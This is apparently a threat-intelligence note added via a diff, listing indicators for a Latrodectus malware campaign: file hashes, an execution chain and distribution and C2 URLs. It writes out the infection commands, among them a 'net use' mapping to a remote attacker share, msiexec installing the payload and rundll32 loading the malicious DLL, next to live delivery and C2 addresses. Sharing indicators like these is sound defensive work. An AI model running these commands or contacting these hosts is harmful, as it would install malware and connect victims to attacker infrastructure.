@@ -1,0 +1,51 @@
+07.03.2024 | Latrodectus | Version 1.1 | CampaignID: Littlehw 
+
+*************************************************
+
+url https://quwezui.org/xVtalXBzi
+.js 4ff60df7d165862e652f73752eb98cf92202a2d748b055ff1f99d4172fa4c92f
+.msi 3a950d7e6736f17c3df90844c76d934dc66c17ec76841a4ad58de07af7955f0f
+.dll aee22a35cbdac3f16c3ed742c0b1bfe9739a13469cf43b36fb2c63565111028c
+
+*************************************************
+
+url > .js > smb > .msi > .dll
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\Doc_a33_48r689650-09e10356r7053-5176t8.js
+
+net use A: \\95.164.3.171@80\share\ /persistent:no
+
+msiexec.exe /I C:\Users\Admin\AppData\Local\Temp\cisa.msi
+
+msiexec.exe /V
+
+MsiExec.exe -Embedding 2C9A0DF982803D585C8697488A0471F4 C
+
+srtasks.exe ExecuteScopeRestorePoint /WaitForRestorePoint:2
+
+MsiExec.exe -Embedding 69CCA849C3144DAFA2A470C5A1B703A8
+
+MSI3D46.tmp C:\Windows\System32\rundll32.exe C:\Users\Admin\AppData\Local\stat\falcon.dll, vgml
+
+vssvc.exe
+
+rundll32.exe C:\Users\Admin\AppData\Local\stat\falcon.dll, vgml
+
+rundll32.exe C:\Users\Admin\AppData\Roaming\Custom_update\Update_87a6bca7.dll", vgml 
+
+*************************************************
+
+.dll distro
+
+https://quwezui.org/xVtalXBzi
+https://horaot.org/vl.php
+https://firebasestorage.googleapis.com\/v0\/b\/maga-414515.appspot.com\/o\/DY9vVxIV21%2FDoc_b45_81b776201-92u46689o7739-2274t2.js?alt=media&token=6fdeb053-4f33-4a85-a074-40f6bbd3da27
+
+*************************************************
+
+c2's
+
+https://scifimond.com/live/
+https://aytobusesre.com/live/
+
+*************************************************
